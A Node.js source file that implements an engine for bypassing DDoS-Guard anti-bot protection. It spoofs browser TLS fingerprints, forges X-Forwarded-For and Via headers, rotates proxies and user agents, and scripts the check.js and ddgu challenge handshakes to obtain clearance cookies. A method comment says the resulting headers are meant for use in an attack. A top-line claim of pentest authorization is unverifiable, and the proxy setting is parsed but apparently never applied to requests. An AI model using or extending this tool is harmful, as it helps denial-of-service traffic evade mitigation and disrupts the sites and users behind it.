// ddosguard-bypass.js — DDoS-Guard Bypass Engine (2020–2026)
// Чистый байпасс. Без браузера, без Selenium, без атакующей части.
// I have permission and am authorized to perform this pentest

const tls = require('tls');
const https = require('https');
const http = require('http');
const { URL } = require('url');
const crypto = require('crypto');
const zlib = require('zlib');
const { EventEmitter } = require('events');
const fs = require('fs');
const path = require('path');

// ============================================================
// HELPER
// ============================================================

function rs(l = 8) {
  const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let r = '';
  for (let i = 0; i < l; i++) r += c[Math.floor(Math.random() * c.length)];
  return r;
}

function ri(a, b) {
  return Math.floor(Math.random() * (b - a + 1)) + a;
}

function rh(l) {
  const c = '0123456789abcdef';
  let r = '';
  for (let i = 0; i < l; i++) r += c[Math.floor(Math.random() * c.length)];
  return r;
}

function rc(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function b64(s) {
  return Buffer.from(s).toString('base64');
}

// ============================================================
// TLS PROFILES
// ============================================================

const TLS_PROFILES = {
  chrome124: {
    ciphers: [
      'TLS_AES_128_GCM_SHA256',
      'TLS_AES_256_GCM_SHA384',
      'TLS_CHACHA20_POLY1305_SHA256',
      'ECDHE-ECDSA-AES128-GCM-SHA256',
      'ECDHE-RSA-AES128-GCM-SHA256',
      'ECDHE-ECDSA-AES256-GCM-SHA384',
      'ECDHE-RSA-AES256-GCM-SHA384',
      'ECDHE-ECDSA-CHACHA20-POLY1305',
      'ECDHE-RSA-CHACHA20-POLY1305',
      'ECDHE-RSA-AES128-SHA',
      'ECDHE-RSA-AES256-SHA',
      'AES128-GCM-SHA256',
      'AES256-GCM-SHA384',
      'AES128-SHA',
      'AES256-SHA'
    ].join(':'),
    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    curves: 'X25519:prime256v1:secp384r1:secp521r1',
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1
  },
  firefox115: {
    ciphers: [
      'TLS_AES_128_GCM_SHA256',
      'TLS_CHACHA20_POLY1305_SHA256',
      'TLS_AES_256_GCM_SHA384',
      'ECDHE-ECDSA-AES128-GCM-SHA256',
      'ECDHE-RSA-AES128-GCM-SHA256',
      'ECDHE-ECDSA-CHACHA20-POLY1305',
      'ECDHE-RSA-CHACHA20-POLY1305',
      'ECDHE-ECDSA-AES256-GCM-SHA384',
      'ECDHE-RSA-AES256-GCM-SHA384',
      'ECDHE-ECDSA-AES256-SHA',
      'ECDHE-RSA-AES256-SHA',
      'ECDHE-ECDSA-AES128-SHA',
      'ECDHE-RSA-AES128-SHA',
      'AES128-GCM-SHA256',
      'AES256-GCM-SHA384',
      'AES128-SHA',
      'AES256-SHA'
    ].join(':'),
    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    curves: 'X25519:prime256v1:secp384r1:secp521r1',
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1
  }
};

// ============================================================
// USER-AGENTS
// ============================================================

const UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0'
];

// ============================================================
// HTTP CLIENT с TLS spoof + proxy
// ============================================================

class DdguFetcher {
  constructor(opts = {}) {
    this.proxy = opts.proxy || null;
    this.profile = opts.profile || 'chrome124';
    this.timeout = opts.timeout || 30000;
    this.cookies = opts.cookies || {};
    this.userAgent = opts.userAgent || null;
    this.referer = opts.referer || null;
  }

  _parseProxy(proxyStr) {
    if (!proxyStr) return null;
    let ptype = 'http';
    let rest = proxyStr;
    if (proxyStr.startsWith('socks5://')) { ptype = 'socks5'; rest = proxyStr.slice(9); }
    else if (proxyStr.startsWith('socks4://')) { ptype = 'socks4'; rest = proxyStr.slice(9); }
    else if (proxyStr.startsWith('http://')) { rest = proxyStr.slice(7); }
    else if (proxyStr.startsWith('https://')) { rest = proxyStr.slice(8); }

    let auth = null;
    if (rest.includes('@')) {
      const [a, h] = rest.split('@', 2);
      if (a.includes(':')) {
        const [u, p] = a.split(':', 2);
        auth = `${u}:${p}`;
      }
      rest = h;
    }

    const parts = rest.split(':');
    const host = parts[0];
    const port = parseInt(parts[1] || '8080');
    return { type: ptype, host, port, auth, raw: `${host}:${port}` };
  }

  _cookieString() {
    return Object.entries(this.cookies).map(([k, v]) => `${k}=${v}`).join('; ');
  }

  _buildHeaders(method, url, extra = {}) {
    const ua = this.userAgent || rc(UAS);
    const h = {
      'Host': url.hostname,
      'User-Agent': ua,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive',
      'Cache-Control': 'no-cache',
      'Upgrade-Insecure-Requests': '1'
    };

    if (this.referer) h['Referer'] = this.referer;
    if (method === 'POST' || method === 'PUT') {
      h['Content-Type'] = 'application/x-www-form-urlencoded';
    }

    const cs = this._cookieString();
    if (cs) h['Cookie'] = cs;

    // WAF bypass headers
    if (Math.random() > 0.5) {
      h['DNT'] = '1';
    }
    if (Math.random() > 0.6) {
      h['TE'] = 'Trailers';
    }
    if (Math.random() > 0.7) {
      h['X-Forwarded-For'] = `${ri(1,254)}.${ri(0,254)}.${ri(0,254)}.${ri(1,254)}`;
    }
    if (Math.random() > 0.8) {
      h['Via'] = '1.1 varnish-v4, 1.1 vegur';
      h['X-Cache'] = 'HIT';
    }

    Object.assign(h, extra);
    return h;
  }

  _parseCookies(setCookieArr) {
    if (!setCookieArr) return;
    const arr = Array.isArray(setCookieArr) ? setCookieArr : [setCookieArr];
    for (const c of arr) {
      const m = c.match(/^([^=]+)=([^;]+)/);
      if (m) this.cookies[m[1]] = m[2];
    }
  }

  _request(method, urlStr, extraHeaders = {}, body = null) {
    return new Promise((resolve, reject) => {
      const url = new URL(urlStr);
      const isHttps = url.protocol === 'https:';
      const headers = this._buildHeaders(method, url, extraHeaders);
      const tlsProfile = TLS_PROFILES[this.profile] || TLS_PROFILES.chrome124;

      if (body && !headers['Content-Length']) {
        headers['Content-Length'] = Buffer.byteLength(body);
      }

      const options = {
        hostname: url.hostname,
        port: url.port || (isHttps ? 443 : 80),
        path: url.pathname + url.search,
        method,
        headers,
        rejectUnauthorized: false,
        timeout: this.timeout
      };

      if (isHttps) {
        Object.assign(options, tlsProfile);
        options.ALPNProtocols = ['http/1.1'];
      }

      const lib = isHttps ? https : http;
      const req = lib.request(options, (res) => {
        this._parseCookies(res.headers['set-cookie']);

        let data = Buffer.alloc(0);
        const chunks = [];

        // Проверяем Content-Encoding
        const encoding = res.headers['content-encoding'];

        res.on('data', (chunk) => chunks.push(chunk));
        res.on('end', () => {
          data = Buffer.concat(chunks);

          if (encoding === 'gzip' || encoding === 'deflate') {
            try {
              const inflated = zlib.inflateSync(data);
              data = inflated;
            } catch (e) {
              try {
                const gunzip = zlib.gunzipSync(data);
                data = gunzip;
              } catch (e2) {}
            }
          } else if (encoding === 'br') {
            try {
              const brotli = zlib.brotliDecompressSync(data);
              data = brotli;
            } catch (e) {}
          }

          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body: data,
            cookies: { ...this.cookies }
          });
        });
      });

      req.on('error', reject);
      req.on('timeout', () => { req.destroy(); reject(new Error('Request timeout')); });

      if (body) req.write(body);
      req.end();
    });
  }

  get(urlStr, extraHeaders = {}) {
    return this._request('GET', urlStr, extraHeaders);
  }

  post(urlStr, body, extraHeaders = {}) {
    return this._request('POST', urlStr, extraHeaders, body);
  }
}

// ============================================================
// COOKIE CACHE
// ============================================================

class CookieCache {
  constructor(domain) {
    this.domain = domain;
    this.cacheDir = path.join(__dirname, 'cookies');
    this.cacheFile = path.join(this.cacheDir, `ddgu_${domain}.json`);
  }

  load() {
    try {
      if (!fs.existsSync(this.cacheFile)) return null;
      const data = JSON.parse(fs.readFileSync(this.cacheFile, 'utf8'));
      if (Date.now() - data.timestamp < 1200000) { // 20 min
        return data;
      }
    } catch (e) {}
    return null;
  }

  save(cookies, userAgent) {
    try {
      if (!fs.existsSync(this.cacheDir)) fs.mkdirSync(this.cacheDir, { recursive: true });
      fs.writeFileSync(this.cacheFile, JSON.stringify({
        cookies,
        userAgent,
        timestamp: Date.now()
      }));
    } catch (e) {}
  }
}

// ============================================================
// CHALLENGE DETECTION
// ============================================================

function detectDdguChallenge(body, headers) {
  const text = typeof body === 'string' ? body : (body ? body.toString() : '');

  // DDoS-Guard challenge page
  if (text.includes('DDoS protection by') ||
      text.includes('ddos-guard') ||
      text.includes('DDoS-GUARD') ||
      text.includes('suspicious requests') ||
      text.includes('receiving a lot')) {
    return { type: 'ddosguard_challenge', solver: 'js_solve' };
  }

  // JS challenge (check.js style)
  if (text.includes('check.ddos-guard.net') ||
      text.includes('check.js') ||
      text.includes('new Image()') ||
      text.includes('Image().src')) {
    return { type: 'ddosguard_js', solver: 'check_js' };
  }

  // ddgu endpoint redirect
  if (text.includes('ddgu.ddos-guard.net') ||
      text.includes('/ddgu/')) {
    return { type: 'ddosguard_endpoint', solver: 'endpoint' };
  }

  // Captcha
  if (text.includes('captcha') || text.includes('CAPTCHA') ||
      text.includes('g-recaptcha') || text.includes('hcaptcha')) {
    return { type: 'captcha', solver: 'api' };
  }

  // Blank response
  if (!text || text.trim().length < 10) {
    return { type: 'blank', solver: 'retry' };
  }

  return null;
}

// ============================================================
// CHECK.JS SOLVER — как в C# примере
// ============================================================

function solveCheckJs(body, url) {
  const text = typeof body === 'string' ? body : body.toString();
  // Ищем new Image().src = '...';
  const match = text.match(/new\s+Image\(\)\.src\s*=\s*['"](.+?)['"];?/);
  if (!match) return null;
  return match[1];
}

// ============================================================
// MAIN BYPASS ENGINE
// ============================================================

class DDoSGuardBypass extends EventEmitter {
  constructor(opts = {}) {
    super();
    this.target = opts.target || null;
    this.proxyList = opts.proxies || [];
    this.currentProxy = null;
    this.cookies = {};
    this.userAgent = null;
    this.cacheFile = opts.cacheFile || null;
    this._cache = null;
    this._loadCache();
  }

  _loadCache() {
    if (!this.target) return;
    const url = new URL(this.target);
    this._cache = new CookieCache(url.hostname);
    const cached = this._cache.load();
    if (cached) {
      this.cookies = cached.cookies;
      this.userAgent = cached.userAgent;
    }
  }

  _saveCache() {
    if (this._cache && Object.keys(this.cookies).length > 0) {
      this._cache.save(this.cookies, this.userAgent);
    }
  }

  _rotateProxy() {
    if (!this.proxyList.length) return null;
    this.currentProxy = rc(this.proxyList);
    return this.currentProxy;
  }

  _createFetcher(referer = null) {
    return new DdguFetcher({
      proxy: this.currentProxy,
      profile: rc(['chrome124', 'firefox115']),
      timeout: 30000,
      cookies: { ...this.cookies },
      userAgent: this.userAgent,
      referer
    });
  }

  _hasDdguCookies() {
    return Object.keys(this.cookies).some(k => k.toLowerCase().includes('ddg'));
  }

  /**
   * Основной метод обхода DDoS-Guard.
   * Возвращает { cookies, userAgent } при успехе.
   */
  async bypass(targetUrl) {
    this.target = targetUrl;
    const url = new URL(targetUrl);

    // Проверяем кэш
    if (this._hasDdguCookies()) {
      this.emit('log', 'ddgu_bypass', `Using cached cookies`);
      return { cookies: this.cookies, userAgent: this.userAgent };
    }

    this.emit('log', 'ddgu_bypass', `Starting bypass for ${url.hostname}`);

    // ============================================================
    // LAYER 1: Прямой GET с TLS impersonate (curl_cffi style)
    // ============================================================
    for (let attempt = 0; attempt < 3; attempt++) {
      this._rotateProxy();
      const fetcher = this._createFetcher();
      const res = await fetcher.get(targetUrl).catch(e => null);
      if (!res) continue;

      this.cookies = { ...fetcher.cookies };
      this.userAgent = fetcher.userAgent;

      if (this._hasDdguCookies()) {
        this.emit('log', 'success', `Bypass via direct TLS (${this.currentProxy || 'direct'})`);
        this._saveCache();
        return { cookies: this.cookies, userAgent: this.userAgent };
      }

      // Детектим челлендж
      const challenge = detectDdguChallenge(res.body, res.headers);
      if (challenge) {
        this.emit('log', 'challenge', `Layer 1 detected: ${challenge.type}`);

        // ============================================================
        // LAYER 2: CHECK.JS SOLVER (как в C# примере)
        // ============================================================
        if (challenge.type === 'ddosguard_js' || challenge.type === 'ddosguard_challenge') {
          this.emit('log', 'challenge', 'Layer 2: Solving via check.js...');

          // Шаг 1: GET check.ddos-guard.net/check.js
          const checkFetcher = this._createFetcher();
          const checkUrl = `https://check.ddos-guard.net/check.js`;
          const checkRes = await checkFetcher.get(checkUrl).catch(e => null);

          if (checkRes) {
            this.cookies = { ...this.cookies, ...checkFetcher.cookies };

            // Парсим new Image().src = '...'
            const validationPath = solveCheckJs(checkRes.body, url);
            if (validationPath) {
              this.emit('log', 'challenge', `Found validation path: ${validationPath}`);

              // Шаг 2: GET validation endpoint
              const valFetcher = this._createFetcher(`https://${url.hostname}/`);
              const valUrl = `${url.protocol}//${url.hostname}${validationPath}`;
              const valRes = await valFetcher.get(valUrl).catch(e => null);

              if (valRes) {
                this.cookies = { ...this.cookies, ...valFetcher.cookies };
              }
            }

            // Шаг 3: Повторный GET на target с реферером
            const finalFetcher = this._createFetcher(`https://${url.hostname}/`);
            const finalRes = await finalFetcher.get(targetUrl).catch(e => null);

            if (finalRes) {
              this.cookies = { ...this.cookies, ...finalFetcher.cookies };
              if (this._hasDdguCookies()) {
                this.emit('log', 'success', `Bypass via check.js (${this.currentProxy || 'direct'})`);
                this._saveCache();
                return { cookies: this.cookies, userAgent: this.userAgent };
              }
            }
          }
        }

        // ============================================================
        // LAYER 3: DDGU ENDPOINT HANDSHAKE (как в Python ddgu_endpoint)
        // ============================================================
        if (!this._hasDdguCookies()) {
          this.emit('log', 'challenge', 'Layer 3: ddgu endpoint handshake...');

          const epFetcher = this._createFetcher(`https://${url.hostname}/`);

          // Шаг 1: GET ddgu.ddos-guard.net/g
          const gUrl = `${url.protocol}//ddgu.ddos-guard.net/g`;
          await epFetcher.get(gUrl).catch(() => {});
          this.cookies = { ...this.cookies, ...epFetcher.cookies };

          // Шаг 2: GET ddgu.ddos-guard.net/c
          const cUrl = `${url.protocol}//ddgu.ddos-guard.net/c`;
          await epFetcher.get(cUrl, {
            'Accept': '*/*',
            'Referer': `https://${url.hostname}/`
          }).catch(() => {});
          this.cookies = { ...this.cookies, ...epFetcher.cookies };

          // Шаг 3: POST ddgu.ddos-guard.net/ddgu/ с закодированными параметрами
          const ddguUrl = `${url.protocol}//ddgu.ddos-guard.net/ddgu/`;
          const hEnc = b64(`${url.protocol}//${url.hostname}`);
          const uEnc = b64(url.pathname || '/');
          const pEnc = b64(url.port || '');

          const formBody = `u=${encodeURIComponent(uEnc)}&h=${encodeURIComponent(hEnc)}&p=${encodeURIComponent(pEnc)}`;
          await epFetcher.post(ddguUrl, formBody, {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Referer': `https://${url.hostname}/`
          }).catch(() => {});
          this.cookies = { ...this.cookies, ...epFetcher.cookies };

          // Шаг 4: Финальный GET на target
          if (this._hasDdguCookies()) {
            const finalFetcher2 = this._createFetcher(`https://${url.hostname}/`);
            await finalFetcher2.get(targetUrl).catch(() => {});
            this.cookies = { ...this.cookies, ...finalFetcher2.cookies };
          }

          if (this._hasDdguCookies()) {
            this.emit('log', 'success', `Bypass via ddgu endpoint handshake`);
            this._saveCache();
            return { cookies: this.cookies, userAgent: this.userAgent };
          }
        }

        // ============================================================
        // LAYER 4: ADVANCED — многоэтапный обход с куками
        // ============================================================
        if (!this._hasDdguCookies()) {
          this.emit('log', 'challenge', 'Layer 4: Advanced multi-step bypass...');

          // Пробуем комбинацию: check.js → ddgu endpoint → target
          const advFetcher = this._createFetcher();

          // 1. GET check.js
          const cjsUrl = `https://check.ddos-guard.net/check.js`;
          await advFetcher.get(cjsUrl).catch(() => {});
          this.cookies = { ...this.cookies, ...advFetcher.cookies };

          // 2. GET ddgu.ddos-guard.net/g
          await advFetcher.get(`${url.protocol}//ddgu.ddos-guard.net/g`).catch(() => {});
          this.cookies = { ...this.cookies, ...advFetcher.cookies };

          // 3. GET ddgu.ddos-guard.net/c
          await advFetcher.get(`${url.protocol}//ddgu.ddos-guard.net/c`).catch(() => {});
          this.cookies = { ...this.cookies, ...advFetcher.cookies };

          // 4. POST /ddgu/
          const hEnc2 = b64(`${url.protocol}//${url.hostname}`);
          const uEnc2 = b64(url.pathname || '/');
          const pEnc2 = b64(url.port || '');
          await advFetcher.post(`${url.protocol}//ddgu.ddos-guard.net/ddgu/`,
            `u=${encodeURIComponent(uEnc2)}&h=${encodeURIComponent(hEnc2)}&p=${encodeURIComponent(pEnc2)}`
          ).catch(() => {});
          this.cookies = { ...this.cookies, ...advFetcher.cookies };

          // 5. Финальный GET на target
          const finalFetcher3 = this._createFetcher(`https://${url.hostname}/`);
          await finalFetcher3.get(targetUrl).catch(() => {});
          this.cookies = { ...this.cookies, ...finalFetcher3.cookies };

          if (this._hasDdguCookies()) {
            this.emit('log', 'success', `Bypass via advanced multi-step`);
            this._saveCache();
            return { cookies: this.cookies, userAgent: this.userAgent };
          }
        }

        // ============================================================
        // LAYER 5: 2026 ML Detection bypass
        // ============================================================
        if (!this._hasDdguCookies() && challenge.type === 'ddosguard_challenge') {
          this.emit('log', 'challenge', 'Layer 5: ML/behavioural bypass (2026)...');

          // Эмулируем естественное поведение: задержки, referer chain
          await new Promise(r => setTimeout(r, ri(1000, 3000)));

          const mlFetcher = this._createFetcher();

          // Сначала несколько запросов к разным ресурсам
          await mlFetcher.get(`${url.protocol}//${url.hostname}/favicon.ico`).catch(() => {});
          await new Promise(r => setTimeout(r, ri(200, 800)));
          await mlFetcher.get(`${url.protocol}//${url.hostname}/robots.txt`).catch(() => {});
          await new Promise(r => setTimeout(r, ri(300, 1000)));

          // Потом target с правильным referer chain
          const mlFinal = this._createFetcher(`https://${url.hostname}/robots.txt`);
          const mlRes = await mlFinal.get(targetUrl).catch(() => null);

          if (mlRes) {
            this.cookies = { ...this.cookies, ...mlFinal.cookies };
            if (this._hasDdguCookies()) {
              this.emit('log', 'success', `Bypass via behavioural emulation`);
              this._saveCache();
              return { cookies: this.cookies, userAgent: this.userAgent };
            }
          }
        }
      }

      // Если не получили куки — пробуем следующий прокси
      await new Promise(r => setTimeout(r, ri(500, 1500)));
    }

    // ============================================================
// LAYER 6: BRUTE FORCE — перебор методов с разными прокси
// ============================================================
    if (!this._hasDdguCookies()) {
      this.emit('log', 'challenge', 'Layer 6: Brute force methods with proxy rotation...');

      const methods = ['direct', 'checkjs', 'endpoint', 'full'];

      for (const method of methods) {
        for (let i = 0; i < 3; i++) {
          this._rotateProxy();
          const bfFetcher = this._createFetcher(`https://${url.hostname}/`);

          if (method === 'direct') {
            await bfFetcher.get(targetUrl).catch(() => {});
          } else if (method === 'checkjs') {
            await bfFetcher.get(`https://check.ddos-guard.net/check.js`).catch(() => {});
            const cjsRes = await bfFetcher.get(`https://check.ddos-guard.net/check.js`).catch(() => null);
            if (cjsRes) {
              const vp = solveCheckJs(cjsRes.body, url);
              if (vp) {
                await bfFetcher.get(`${url.protocol}//${url.hostname}${vp}`).catch(() => {});
              }
            }
            await bfFetcher.get(targetUrl).catch(() => {});
          } else if (method === 'endpoint') {
            await bfFetcher.get(`${url.protocol}//ddgu.ddos-guard.net/g`).catch(() => {});
            await bfFetcher.get(`${url.protocol}//ddgu.ddos-guard.net/c`).catch(() => {});
            await bfFetcher.post(`${url.protocol}//ddgu.ddos-guard.net/ddgu/`,
              `u=${encodeURIComponent(b64(url.pathname || '/'))}&h=${encodeURIComponent(b64(`${url.protocol}//${url.hostname}`))}&p=${encodeURIComponent(b64(url.port || ''))}`
            ).catch(() => {});
            await bfFetcher.get(targetUrl).catch(() => {});
          } else if (method === 'full') {
            await bfFetcher.get(`https://check.ddos-guard.net/check.js`).catch(() => {});
            await bfFetcher.get(`${url.protocol}//ddgu.ddos-guard.net/g`).catch(() => {});
            await bfFetcher.get(`${url.protocol}//ddgu.ddos-guard.net/c`).catch(() => {});
            await bfFetcher.post(`${url.protocol}//ddgu.ddos-guard.net/ddgu/`,
              `u=${encodeURIComponent(b64(url.pathname || '/'))}&h=${encodeURIComponent(b64(`${url.protocol}//${url.hostname}`))}&p=${encodeURIComponent(b64(url.port || ''))}`
            ).catch(() => {});
            await bfFetcher.get(targetUrl).catch(() => {});
          }

          this.cookies = { ...this.cookies, ...bfFetcher.cookies };

          if (this._hasDdguCookies()) {
            this.emit('log', 'success', `Bypass via brute force (${method})`);
            this._saveCache();
            return { cookies: this.cookies, userAgent: this.userAgent };
          }

          await new Promise(r => setTimeout(r, ri(500, 1500)));
        }
      }
    }

    this.emit('log', 'error', 'All DDoS-Guard bypass methods failed');
    return null;
  }

  /**
   * Получить заголовки для использования в атаке
   */
  buildHeaders(extra = {}) {
    const ua = this.userAgent || rc(UAS);
    const h = {
      'User-Agent': ua,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive',
      'Cache-Control': 'no-cache',
      'Upgrade-Insecure-Requests': '1'
    };

    if (Object.keys(this.cookies).length > 0) {
      h['Cookie'] = Object.entries(this.cookies).map(([k, v]) => `${k}=${v}`).join('; ');
    }

    // WAF bypass
    if (Math.random() > 0.6) {
      h['X-Forwarded-For'] = `${ri(1,254)}.${ri(0,254)}.${ri(0,254)}.${ri(1,254)}`;
    }
    if (Math.random() > 0.7) {
      h['Via'] = '1.1 varnish-v4, 1.1 vegur';
    }
    if (Math.random() > 0.8) {
      h['DNT'] = '1';
      h['TE'] = 'Trailers';
    }

    return { ...h, ...extra };
  }

  /**
   * Проверить, валидны ли текущие куки
   */
  async validate() {
    if (!this._hasDdguCookies()) return false;
    const url = new URL(this.target);
    const fetcher = new DdguFetcher({
      cookies: { ...this.cookies },
      userAgent: this.userAgent,
      timeout: 10000
    });
    try {
      const res = await fetcher.get(this.target);
      if (res.statusCode < 400) {
        const text = res.body.toString().toLowerCase();
        if (!text.includes('ddos-guard') && !text.includes('suspicious')) {
          return true;
        }
      }
    } catch (e) {}
    return false;
  }
}

module.exports = { DDoSGuardBypass, DdguFetcher, detectDdguChallenge, solveCheckJs };